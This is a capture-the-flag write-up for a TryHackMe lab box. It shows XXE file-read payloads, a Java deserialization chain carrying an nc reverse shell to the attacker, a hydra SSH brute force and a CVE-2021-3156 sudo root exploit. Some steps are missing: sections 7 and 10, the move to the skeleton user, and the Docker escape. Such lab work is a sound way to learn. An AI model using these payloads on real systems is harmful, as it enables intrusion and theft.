# TryHackMe: You're in a Cave — Insane CTF

**Target:** Apache/PHP web app + custom Java RPG TCP service + SSH, Ubuntu box inside Docker  
**Attack host:** Kali Linux with nmap, gobuster, nc, Java (JDK), hydra, gpg, john, Python3

This is a full account of how we actually solved this box — including the dead ends.
It chains together XXE injection, Java deserialization RCE, regex-based SSH brute force,
steganographically hidden PGP passphrase, binary inventory exploitation, a well-known
sudo heap overflow (CVE-2021-3156), and Docker container escape via raw block device mount.

---

## 1. Recon

```bash
sudo nmap -p- --min-rate=1000 -T4 <TARGET_IP>
sudo nmap -sC -sV -p 80,2222,3333 <TARGET_IP>
```

Three ports open:

- **80/tcp** — Apache 2.4.41 (Ubuntu)
- **2222/tcp** — OpenSSH 8.2p1
- **3333/tcp** — Custom Java TCP service, immediately greets with: `You find yourself in a cave, what do you do?`

The root page at `/` contained a plain HTML form posting `action` to `action.php`. Every
request to `action.php` — GET, POST, any content-type, any body — returned a blank
`HTTP/1.1 400 Bad Request` with zero body. This is the first significant blocker and took
considerable time to resolve.

## 2. The RPG Game (Port 3333)

Connecting via `nc <TARGET_IP> 3333` presents the cave prompt and accepts exactly one line
of input before closing the connection. There is no interactive state — every connection
resets.

We brute-forced recognized verbs using a Python socket script with a curated RPG word list:

```python
import socket, time

TARGET = "<TARGET_IP>"
PORT = 3333
DELAY = 0.5

def try_word(word):
    s = socket.create_connection((TARGET, PORT), timeout=5)
    s.sendall((word + "\n").encode())
    s.settimeout(3)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
    except socket.timeout:
        pass
    s.close()
    return data.decode(errors="replace")
```

Recognized verbs and their responses:

| Verb | Response |
|------|----------|
| `attack` | "You punch the wall, nothing happens." |
| `search` | "You can't see anything, the cave is very dark." |
| `walk` | "There's nowhere to go." |
| `matches` | Runs `` `pwd` `` — reveals `/home/cave/src` |
| `lamp` | Runs `` `ls` `` — lists directory contents |

> **Gotcha:** We initially tried multi-word inputs and compound commands. The server parses
> only the exact verb with no arguments — anything else falls through to "Nothing happens."

The `matches` and `lamp` responses revealed the key detail: these verbs embed backtick-wrapped
shell commands in their `command` field, which get passed to `/bin/sh -c "echo \"<command>\""`.
This was our first hint at how the game works internally.

## 3. Web Enumeration

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/big.txt
```

Found (all returning 200 with serialized body): `/attack`, `/search`, `/walk`, `/matches`, `/lamp`

Each endpoint returns a **base64-encoded Java serialized `Action` object**. Decoding one:

```python
import base64
data = base64.b64decode("<base64_from_endpoint>")
print(data)
```

The binary reveals a Java class named `Action` with three String fields: `command`, `name`, `output`.
The `lamp` object's `command` field contained: `You grab a lamp...\n\`ls;export INVENTORY=lamp:$INVENTORY\``

This confirmed the exploitation model. The Apache config read (via XXE, below) also revealed a
second vhost: `adventurer.cave.thm` serving `/var/www/adventurer/`.

## 4. Cracking action.php (XXE)

After exhausting every conventional approach to `action.php`, we noticed the 400 response was
generated by Apache itself (empty body, `Connection: close`) — not PHP. Every content-type
returned 400 **except `application/xml` and `text/xml`**, which returned 200.

Classic XXE test:

```bash
curl -s -X POST http://<TARGET_IP>/action.php \
  -H "Content-Type: application/xml" \
  --data-binary '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>'
# Returns: cave
```

Reading `action.php` itself via PHP filter wrapper confirmed the exact vulnerable code:

```bash
curl -s -X POST http://<TARGET_IP>/action.php -H "Content-Type: application/xml" \
  --data-binary '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/action.php">]><foo>&xxe;</foo>' | base64 -d
```

```php
$dom->loadXML($data, LIBXML_NOENT | LIBXML_DTDLOAD);
$xml = simplexml_import_dom($dom);
echo $xml;
```

`action.php` is a pure XXE reflector — `LIBXML_NOENT` enables entity substitution,
`libxml_disable_entity_loader(false)` keeps external entities active, and it simply echoes
back the parsed XML text. No write capability — just arbitrary file read, reflecting content
back as the response body.

> **Gotcha:** Reading PHP files directly (without `php://filter/convert.base64-encode`)
> causes the XML parser to choke on `<?php`, `<`, and `&` characters in the source. Always
> use the base64 filter wrapper when reading PHP or other files containing XML-special characters.

Key files read via XXE:

- `/home/cave/src/RPG.java` — full game source
- `/etc/passwd` — confirmed users: `cave`, `door`, `skeleton`
- `/etc/apache2/apache2.conf` — revealed `adventurer.cave.thm` vhost
- `/home/cave/info.txt` — the door carving (flag question 1)

> **Gotcha:** `/home/door/` and `/home/skeleton/` returned "failed to load external entity" — 
> `www-data` cannot traverse into those directories (permissions `750`). We needed real shell access.

## 5. RPG.java — Understanding the Full Exploit Chain

The game source revealed the critical logic:

```java
String s = scanner.nextLine();
URL url = new URL("http://cave.thm/" + s);
URLConnection con = url.openConnection();
InputStream in = con.getInputStream();
String string = IOUtils.toString(in, encoding);
string = string.replace("\n", "").replace("\r", "").replace(" ", "");
Action action = (Action) Serialize.fromString(string);
action.action();
serverPrintOut.println(action.output);
```

The server takes our raw socket input `s`, appends it to `http://cave.thm/`, fetches that URL,
deserializes the response as an `Action` object, and executes its `command` field.

Since `action.php` echoes back whatever XML text we provide, and `cave.thm` resolves to
`127.0.0.1` (confirmed via `/etc/hosts`), the full RCE chain is:

1. Build a malicious serialized `Action` object with our payload in `command`
2. Base64-encode it
3. Wrap in XML: `<?xml version="1.0" encoding="UTF-8"?><foo>[base64]</foo>`
4. URL-encode the XML
5. Send as socket input: `action.php?[url-encoded-xml]`
6. Game fetches `http://cave.thm/action.php?[xml]` from localhost → `action.php` echoes
   our base64 back → game deserializes it → executes our command

## 6. Building the Malicious Payload

The `Action` class has three fields in serialization order: `command`, `name`, `output`.
We extracted the exact header bytes from a known-good decoded object, then built our own:

```python
import struct, base64, urllib.parse

attack_raw = b'\xac\xed\x00\x05sr\x00\x06Action...'  # known-good object bytes
idx = attack_raw.index(b'xp') + 2
header = attack_raw[:idx]

def build_action(command, name, output=""):
    def s(t):
        b = t.encode()
        return b't' + struct.pack('>H', len(b)) + b
    payload = header + s(command) + s(name) + s(output)
    return base64.b64encode(payload).decode()
```

For the actual reverse shell, we compiled from Java source to match the exact target runtime
and avoid glibc compatibility issues, using the injection technique from the RPG source:

```java
// RPG2.java
String str = Serialize.toString( new Action("abc",
    "trying\";(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <VPN_IP> 4444 >/tmp/f)>/dev/null 2>&1 & disown;echo \"")
);
System.out.println("abc : " + str);
```

The `\";...; echo \"` injection breaks out of the `/bin/sh -c "echo \"<command>\""` wrapper
to execute arbitrary shell commands. The `nohup ... & disown` keeps it backgrounded so the
single-threaded RPG server doesn't hang waiting for the process to exit.

> **Critical gotcha:** The RPG server is single-threaded. If the executed command doesn't
> return (blocking reverse shell without `& disown`), the server hangs forever and cannot
> accept new connections. The machine must be redeployed to recover. Always background
> and disown the reverse shell.

```bash
# Compile natively (avoids glibc version mismatch)
javac RPG2.java
java RPG2
# outputs: abc : rO0ABXNy...

# Wrap and deliver
echo 'action.php?<url_encoded_xml>' | nc -q3 <TARGET_IP> 3333
```

**Result:** Reverse shell as `cave` (uid=1000)

## 8. Cracking the Door — SSH as `door`

We generated every string matching the regex (1,296 candidates):

```python
import itertools

part1_chars = ['h', '#', 'f']
part2_chars = ['1', '2', '3']
part3_chars = ['!', '@', '#', '*']

with open('/tmp/door_wordlist.txt', 'w') as f:
    for p1 in itertools.product(part1_chars, repeat=3):
        for length in [1, 2]:
            for p2 in itertools.product(part2_chars, repeat=length):
                for p3 in part3_chars:
                    pw = 'ed' + ''.join(p1) + ''.join(p2) + 'xf' + p3
                    f.write(pw + '\n')
```

Verified against `exrex` — lists were identical. Then ran Hydra:

```bash
hydra -l door -P /tmp/door_wordlist.txt -s 2222 ssh://<TARGET_IP> -t 8 -f
```

**Result:** `door` / `edfh#22xf!`

> **Gotcha:** Using `-t 1` took over 76 minutes. `-t 4` caused timeout errors on this
> instance. `-t 8` completed in approximately 9 minutes cleanly.

## 9. Decrypting the Old Man's Message

From `door`'s home directory:

- `info.txt` — narrative about the cave and skeleton
- `oldman.gpg` — PGP-encrypted file, encrypted to key ID `D5A213D292A0A259`
- `skeleton` — 2MB execute-only binary (mode `--x` for door/skeleton users)

Adding `adventurer.cave.thm` to `/etc/hosts` and browsing it revealed a directory listing
with one file: `adventurer.priv` — the PGP private key for `adventurer <adventurer@cave.com>`.

The private key's subkey `D5A213D292A0A259` matches exactly what `oldman.gpg` was encrypted
to. The key requires a passphrase.

### Finding the Hidden Passphrase

Looking at `door`'s `info.txt` with `cat -v` (which displays non-printable characters):

```bash
cat -v /home/door/info.txt
```

```
...The private key password is breakingbonessince1982 ^[[A
It looks like the skeleton doesn't want to let anyone pass through.
```

The ANSI escape sequence `^[[A` (cursor up) caused the password line to be overwritten by the
following line during normal display — making it completely invisible to `cat`, `less`, and
most editors showing rendered output. Only `cat -v` or a hex editor reveals it.

**Passphrase:** `breakingbonessince1982`

> **Gotcha:** GPG version mismatches between Kali and the target caused repeated "No secret
> key" errors during import, even after the public key successfully imported. The most reliable
> approach was to import and decrypt directly on the target as the `door` user:

```bash
curl -s http://adventurer.cave.thm/adventurer.priv | gpg --batch --passphrase "breakingbonessince1982" --pinentry-mode loopback --import
gpg --batch --passphrase "breakingbonessince1982" --pinentry-mode loopback --decrypt /home/door/oldman.gpg
```

**Output:**
```
IT'S DANGEROUS TO GO ALONE! TAKE THIS bone-breaking-war-hammer
```

## 11. Privilege Escalation — Baron Samedit (CVE-2021-3156)

SSHing in as `skeleton` and checking sudo privileges:

```bash
sudo -l
# (root) NOPASSWD: /bin/kill
sudo --version
# Sudo version 1.8.31
```

Sudo 1.8.31 is vulnerable to CVE-2021-3156 (Baron Samedit) — a heap overflow in `sudoedit`
that allows privilege escalation to root regardless of sudoers configuration.

The binary compiled on Kali (glibc 2.34) failed with a version mismatch on the target (glibc 2.31).
We compiled directly on the target instead:

```bash
# Transfer source from Kali
scp -P 2222 -r /tmp/CVE-2021-3156 skeleton@<TARGET_IP>:/tmp/

# Compile natively on target
cd /tmp/CVE-2021-3156
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c

# Run the Python variant (more reliable against this build)
python3 /tmp/exploit_nss.py
# #
```

> **Gotcha:** The C binary exploit (`sudo-hax-me-a-sandwich 1`) failed with the standard
> offsets for Ubuntu 20.04.1. The Python variant (`exploit_nss.py` from worawit's fork)
> succeeded without needing exact offsets.

**Result:** Root shell inside the Docker container.

## Key Takeaways / Lessons

1. **A blanket HTTP 400 is not always a WAF or IP block** — here it was purely a
   Content-Type gate. Testing every content-type systematically (not just form-encoded and JSON)
   is essential, and `application/xml` is a non-obvious but real attack surface.

2. **Text files can hide data using ANSI escape sequences** — `^[[A` (cursor up) causes the
   terminal to overwrite the preceding line, making credentials invisible to `cat` but visible
   to `cat -v`, `xxd`, or any hex viewer. A file that "looks clean" may not be.

3. **Single-threaded TCP services need non-blocking payloads** — sending a blocking command
   to the RPG server killed it permanently for the session. Always background and disown
   reverse shells when the server's threading model is unknown.

4. **Compile exploits natively when possible** — glibc version mismatches between attack
   machine and target are a common silent failure mode for C exploits. When you have shell
   access and gcc is available, recompiling on the target eliminates the variable entirely.

5. **Docker doesn't hide the host disk** — block devices that back mounted volumes remain
   visible inside a container and mountable by a root process. A privileged process inside
   a non-privileged Docker container can still read the host filesystem via raw device access.

6. **Regex-based passwords are enumerable** — a password policy expressed as a regex with
   bounded character classes and limited repetition is just a wordlist with a formal
   definition. Generate it with `itertools` or `exrex` and brute-force it like any other list.
